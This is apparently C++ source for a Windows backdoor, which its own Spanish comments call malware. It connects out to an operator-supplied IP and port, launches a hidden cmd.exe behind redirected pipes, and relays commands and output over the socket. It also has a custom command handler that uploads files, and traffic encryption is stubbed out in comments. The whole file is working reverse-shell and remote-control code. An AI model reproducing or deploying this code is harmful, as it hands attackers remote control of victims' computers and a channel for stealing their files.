#define WIN32_LEAN_AND_MEAN

#include <stdio.h> 
#include <strsafe.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include "Socket_functions_header.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

HANDLE hReadPipe1 = NULL;
HANDLE hWritePipe1 = NULL;
HANDLE hReadPipe2 = NULL;
HANDLE hWritePipe2 = NULL;
HANDLE hReadPipeCommands = NULL;
HANDLE hWritePipeCommands = NULL;

PROCESS_INFORMATION piProcInfo;

SOCKET ConnectSocket = INVALID_SOCKET;


void MyWaitForSingleObject() {
	WaitForSingleObject(piProcInfo.hProcess, INFINITE);
}

void ReadFromPipe(CHAR* chBuf, LPDWORD sizeBuf, HANDLE hReadPipe)
// Read output from the child process's pipe for STDOUT
// and write to the parent process's pipe for STDOUT. 
{
	BOOL bSuccess = FALSE;
	bSuccess = ReadFile(hReadPipe, chBuf, BUFSIZE, sizeBuf, NULL);
	//recursive_xor_encrypt(CIPHER_CHAR_KEY, chBuf, *sizeBuf); // CIPHER
	/* Pinta en consola lo que se lee del Pipe(salida de consola)
	DWORD dwWritten;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	bSuccess = WriteFile(hParentStdOut, chBuf, *pdwRead, &dwWritten, NULL);
	*/
}

DWORD WINAPI FromPipeCommandsToSocket(LPVOID lpParameter) {
	//Read From Pipe & Write to the socket
	CHAR chBuf[BUFSIZE];
	DWORD numBytesRead = NULL;
	int nBytesSent;
	COMMANDS control_commands;
	char* response;
	while (1) {
		ReadFromPipe(chBuf, &numBytesRead, hReadPipeCommands);
		//Create commands index and return the response through the socket
		control_commands.set_length_cmd(numBytesRead);
		response = control_commands.exec(chBuf);
		if (control_commands.get_is_uploading()) { //Si estamos mandado un archivo (uploading)
			nBytesSent = send(ConnectSocket, response, control_commands.get_file_size_up(), NULL);
			control_commands.set_is_uploading(FALSE);
		}
		else
			nBytesSent = send(ConnectSocket, response, strlen(response), NULL);
		WriteToPipe("\n", 1, hWritePipe1); //Con esto conseguimos que siempre nos ponga el path en el que estamos después de ejecutar cualquier comando propio del malware
		Sleep(SLEEP_TIME);
	}
}

DWORD WINAPI FromPipeToSocket(LPVOID lpParameter) {
	//Read From Pipe & Write to the socket
	CHAR chBuf[BUFSIZE];
	DWORD dwRead = NULL;
	int nBytesSent;
	while (1) {
		ReadFromPipe(chBuf, &dwRead, hReadPipe2);
		nBytesSent = send(ConnectSocket, chBuf, dwRead, NULL);
		Sleep(SLEEP_TIME);
	}
}

void WriteToPipe(CHAR* chBuf, DWORD sizeBuf, HANDLE hWritePipe)
// Read from a file and write its contents to the pipe for the child's STDIN.
// Stop when there is no more data. 
{
	DWORD dwWritten;
	BOOL bSuccess = FALSE;
	//recursive_xor_encrypt(CIPHER_CHAR_KEY, chBuf, sizeBuf); //CIPHER
	bSuccess = WriteFile(hWritePipe, chBuf, sizeBuf, &dwWritten, NULL);
}

DWORD WINAPI FromSocketToPipe(LPVOID lpParameter) {
	//Read from socket & Write to pipe
	int nBytesRecv;
	char recvbuf[BUFSIZE];
	int recvbuflen = BUFSIZE;
	char * pos;
	do {
		//ZeroMemory(recvbuf, BUFSIZE);
		nBytesRecv = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (nBytesRecv > 0) {
			//printf("%.*s\n", nBytesRecv, recvbuf); // Pinta del buffer recvbuflen el numero de bytes que llegaron
			//printf("Bytes received: %d\n", iResult);
			if (strncmp(recvbuf, CMD, CMD_LENGTH) != 0) 
				//printf("Escribo en command\n");
				WriteToPipe(recvbuf, nBytesRecv, hWritePipeCommands); //Escribimos al pipe de comandos propios
			else {				//Que lo interprete CMD
				//printf("pos:%d\n", pos+1); 
				pos = strchr(recvbuf, ' ') + 1;
				nBytesRecv = nBytesRecv - (pos - recvbuf);
				WriteToPipe(pos, nBytesRecv, hWritePipe1);
			}
		}
		else
			TerminateProcess(piProcInfo.hProcess, 0); //Si se cierra la conexión cerramos el proceso de la consola y así se cierra el get_console
		
		Sleep(SLEEP_TIME);
	} while (1);
}

int CreateChildProcess()
// Create a child process that uses the previously created pipes for STDIN and STDOUT.
{
	TCHAR szCmdline[] = TEXT("cmd.exe");
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;

	// Set up members of the PROCESS_INFORMATION structure. 
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = hWritePipe2;
	siStartInfo.hStdOutput = hWritePipe2;
	siStartInfo.hStdInput = hReadPipe1;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	// Create the child process. 
	bSuccess = CreateProcess(NULL,
		szCmdline,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		0,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

					   // If an error occurs, exit the application. 
	if (!bSuccess)
		return 1;
	return 0;
	/*else
	{
		// Close handles to the child process and its primary thread.
		// Some applications might keep these handles to monitor the status
		// of the child process, for example. 
		//CloseHandle(piProcInfo.hProcess);
		//CloseHandle(piProcInfo.hThread);
	}*/
}

void CreatePipes() {
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited. 
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	// Create a pipe for the child process's STDOUT. 
	if (!CreatePipe(&hReadPipe2, &hWritePipe2, &saAttr, 0))
		ExitProcess(1);

	// Ensure the read handle to the pipe for STDOUT is not inherited.
	if (!SetHandleInformation(hReadPipe2, HANDLE_FLAG_INHERIT, 0))
		ExitProcess(1);

	// Create a pipe for the child process's STDIN. 
	if (!CreatePipe(&hReadPipe1, &hWritePipe1, &saAttr, 0))
		ExitProcess(1);

	// Ensure the write handle to the pipe for STDIN is not inherited. 
	if (!SetHandleInformation(hWritePipe1, HANDLE_FLAG_INHERIT, 0))
		ExitProcess(1);

	if (!CreatePipe(&hReadPipeCommands, &hWritePipeCommands, &saAttr, 0))
		ExitProcess(1);

}

int ConSocket(char* ip, char* port) {
	WSADATA wsaData;
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;
	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	//iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		//printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			//printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}
	freeaddrinfo(result);

	return 0;
}













